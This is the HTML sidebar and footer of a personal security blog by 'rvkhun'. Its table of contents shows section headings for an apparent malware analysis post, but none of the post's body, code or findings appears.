          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#File-info"><span class="nav-number">1.</span> <span class="nav-text">File info</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Static-Analysis"><span class="nav-number">2.</span> <span class="nav-text">Static Analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EB%B6%84%EC%84%9D%ED%99%98%EA%B2%BD"><span class="nav-number">2.0.1.</span> <span class="nav-text">분석환경</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-1"><span class="nav-number">2.1.</span> <span class="nav-text">Step 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-2"><span class="nav-number">2.2.</span> <span class="nav-text">Step 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-3"><span class="nav-number">2.3.</span> <span class="nav-text">Step 3</span></a></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#Malicious-behavior"><span class="nav-number">3.</span> <span class="nav-text">Malicious behavior</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Flow"><span class="nav-number">3.1.</span> <span class="nav-text">Flow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Functions"><span class="nav-number">3.2.</span> <span class="nav-text">Functions</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Execution"><span class="nav-number">4.</span> <span class="nav-text">Execution</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="rvkhun" src="/images/raccoon1.jpg">
  <p class="site-author-name" itemprop="name">rvkhun</p>
  <div class="site-description" itemprop="description">Security Researcher / CTF Player</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="mailto:pwnkidhn@gmail.com" title="E-Mail → mailto:pwnkidhn@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="https://youtube.com/" title="YouTube → https:&#x2F;&#x2F;youtube.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-youtube"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="https://instagram.com/_choizy_" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;_choizy_" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-instagram"></i></a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rvkhun</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Gemini</a>
  </div>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
